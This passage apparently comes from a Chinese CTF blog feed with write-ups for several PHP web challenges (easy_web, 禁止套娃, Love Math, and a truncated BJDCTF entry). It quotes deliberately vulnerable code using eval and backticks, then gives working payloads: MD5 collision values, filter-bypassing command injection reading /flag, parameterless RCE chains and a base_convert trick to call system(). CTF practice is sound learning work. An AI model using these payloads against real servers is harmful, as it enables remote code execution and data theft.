&#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>get传参gg和id 须绕过md5函数<br>md5用数组绕，md5()函数无法操作数组，返回NULL，两个NULL相等</p><p>is_numberic()函数 可以使用数字加字符绕过。is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！在后面加a也可以</p><p>构造payload<br>get提交</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">?gg[]=1&amp;id[]=2<br>​```shell<br>passwd=1234567%00 使用post提交<br><br>提交后得到flag<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安洵杯 2019 easy_web</title>
    <link href="/2022/03/03/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/"/>
    <url>/2022/03/03/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web/</url>
    
    <content type="html"><![CDATA[<h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>12&#x2F;1&#x2F;2020 </p><p>雨    气死我了么</p><p>这题整整看了近2个小时 不知道做了多少遍  气死我吧</p><p>在url处看到一个img参数值为TXpVek5UTTFNbVUzTURabE5qYz0</p><p>经过2次base64 和一次hex解密后得到一个555.png</p><p>将index.php 经过一次hex加密和2次base64加密 传值得到一串base64加密内容  解密后就是index.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class="hljs-comment">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>md5强类型绕过<br>要求post a和b，不能是同一个字符串但是md5之后类型和数值相同<br>payload<br>post</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<br></code></pre></td></tr></table></figure><p>get payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?cmd=c\at%20/flag<br></code></pre></td></tr></table></figure><p>总结：<br>错误原因</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /index.php?cmd=c\at%20/flag HTTP/1.1<br>Host: 894477dc-68e9-41a5-ad83-5ec08e12beb6.node3.buuoj.cn<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Referer: http://894477dc-68e9-41a5-ad83-5ec08e12beb6.node3.buuoj.cn/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded    //我抓的包没有这个<br>Content-Length: 391<br>//留了2行<br>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GXYCTF2019禁止套娃</title>
    <link href="/2022/03/03/GXYCTF2019%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/"/>
    <url>/2022/03/03/GXYCTF2019%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
    
    <content type="html"><![CDATA[<h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p>11&#x2F;30&#x2F;2020</p><p>傍晚有风   饥饿</p><p>题目就一句话 源码和network都看不到有用的信息  尝试dirsearch后台扫描<br>扫到了.git目录  猜想是git 源码泄露<br>使用githack 下载到源码<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>分析源码：</p><p>1.GET方式传入exp参数，若满足条件，则将exp内容当做php代码来执行。<br>2.过滤了data&#x2F;filter&#x2F;php&#x2F;phar伪协议，不能以伪协议直接读取文件。<br>3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。<br>4.正则匹配还过滤了et&#x2F;na&#x2F;info等关键字，导致get等很多函数用不了<br>5.eval($_GET[‘exp’]); 典型的无参数RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])<br></code></pre></td></tr></table></figure><p>该正则表达式 正是我们说的无参数函数的校验，其只允许执行如下格式函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">a</span>(<span class="hljs-title function_ invoke__">b</span>(<span class="hljs-title function_ invoke__">c</span>()));<br><span class="hljs-title function_ invoke__">a</span>();<br></code></pre></td></tr></table></figure><p>首先需要得到当前目录下的文件<br>scandir()函数可以扫描当前目录下的文件，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>但是要如何构造scandir(‘.’)，这里有个‘.’直接传入就相当于还是传入一个参数，exp还是被过滤掉了，所以我们要想个其他的方法代替’.’<br>这里涉及到一个知识点：<br>current(localeconv())永远都是个点<br>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br>current() 返回数组中的当前单元, 默认取第一个值。<br>pos()是current()的别名。<br>pos(localeconv())和current(localeconv())的结果一样，都是表示’.’<br>所以这两个函数嵌套使用就是一个’.’</p><p>那么我们第一步就解决了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">pos</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br></code></pre></td></tr></table></figure><p>接下来就是读取到倒数第二个数组</p><p>array_flip()：交换数组中的键和值。</p><p>此时将键和值做了一下交换，下一步就是如何取出他的键。</p><p>array_rand():从数组中随机取出一个或多个单元</p><p>最后一个问题，如何读取flag.php的源码。<br>由于et被过滤掉了，所以不能使用file_get_contents()，但是可以使用highlight_file()函数。<br>有了以上的函数，我们就可以将这些函数组合起来读取flag了。<br>highlight_file() 函数对文件进行语法高亮显示。</p><p>构造payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">?exp=print_r(scandir(pos(localeconv())));<br>?exp=highlight_file(array_rand(array_flip(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><p>另一种方法：</p><p>array_reverse():<br>array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。</p><p>如果第二个参数指定为 true，则元素的键名保持不变，否则键名将丢失。<br>next() 函数将内部指针指向数组中的下一个元素，并输出。<br>反转元素顺序 并使用next（）函数读取<br>payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><p>这个时候会想到  为什么不直接嵌套几个next()呢 非要用array_reverse() 这个我写了一个php程序<br>会报语法错误 我想这也是题目为什么叫禁止套娃的原因吧</p><p>提交payload得到flag 第一种方法需要多提交几次 因为array_rand()函数是随机的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN 2019 初赛Love Math</title>
    <link href="/2022/03/03/CISCN-2019-%E5%88%9D%E8%B5%9BLove-Math/"/>
    <url>/2022/03/03/CISCN-2019-%E5%88%9D%E8%B5%9BLove-Math/</url>
    
    <content type="html"><![CDATA[<h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h3><p>12&#x2F;8&#x2F;2020</p><p>阴    正常</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>1.payload长度不能超过80</p><p>2.payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘&#96;’, ‘[‘, ‘]’ 这些字符</p><p>3.payload中不能有不是$whitelist白名单里面的单词出现</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="language-bash">pi=base_convert(37907361743,10,36)(dechex(1598506324));($<span class="hljs-variable">$pi</span>)&#123;pi&#125;(($<span class="hljs-variable">$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=<span class="hljs-built_in">tac</span> /flag</span><br>base_convert(37907361743,10,36) =&gt; &quot;hex2bin&quot;<br>dechex(1598506324) =&gt; &quot;5f474554&quot;<br><span class="hljs-meta">$</span><span class="language-bash">pi=hex2bin(<span class="hljs-string">&quot;5f474554&quot;</span>) =&gt; <span class="hljs-variable">$pi</span>=<span class="hljs-string">&quot;_GET&quot;</span>   //hex2bin将一串16进制数转换为二进制字符串</span><br><span class="hljs-meta">($</span><span class="language-bash"><span class="hljs-variable">$pi</span>)&#123;pi&#125;(($<span class="hljs-variable">$pi</span>)&#123;abs&#125;) =&gt; (<span class="hljs-variable">$_GET</span>)&#123;pi&#125;(<span class="hljs-variable">$_GET</span>)&#123;abs&#125;  //&#123;&#125;可以代替[]</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF2020Easy MD5</title>
    <link href="/2022/03/03/BJDCTF2020Easy-MD5-1/"/>
    <url>/2022/03/03/BJDCTF2020Easy-MD5-1/</url>
    
    <content type="html"><![CDATA[<h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><p>12&#x2F;5&#x2F;2020</p><p>晴   正常</p><p>题目给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span 